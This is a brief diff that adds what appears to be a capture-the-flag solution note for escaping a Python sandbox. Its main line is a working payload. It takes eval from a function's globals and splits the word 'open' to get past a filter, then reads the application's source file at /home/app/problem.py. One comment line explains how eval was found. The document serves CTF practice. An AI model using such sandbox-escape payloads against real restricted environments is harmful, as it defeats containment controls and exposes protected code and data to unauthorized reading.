@@ -1,0 +1,3 @@
+get_flag.func_globals.values()[-6]("ope"+"n('/home/app/problem.py').read()")
+
+we found eval() by checking out the func globals on a given function
